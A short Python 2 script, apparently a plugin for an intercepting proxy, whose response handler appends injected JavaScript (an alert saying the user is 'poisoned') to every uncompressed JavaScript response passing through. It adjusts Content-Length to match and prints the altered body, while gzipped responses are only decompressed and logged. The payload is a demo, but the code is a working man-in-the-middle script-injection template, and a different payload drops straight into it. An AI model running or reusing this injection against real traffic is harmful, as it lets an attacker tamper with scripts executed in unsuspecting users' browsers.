'''
Created on Apr 8, 2015

@author: kehan_wang
'''
import zlib

def proxy_mangle_request(req):
    print req
    return req

def proxy_mangle_response(res):
    posionScript = 'alert("hahaha, you\'re poisoned!");'
    if 'application/javascript' in res.getHeader('Content-type'):
        if 'gzip' in res.getHeader('Content-Encoding'):
            print zlib.decompress(res.body,16+zlib.MAX_WBITS)
            print "GXIP not POsioned"
        else:
            res.body = res.body + posionScript
            res.setHeader('Content-Length', len(res.body))
            print "#################POSIONED#####################"
            print res.body
    print res
    return res
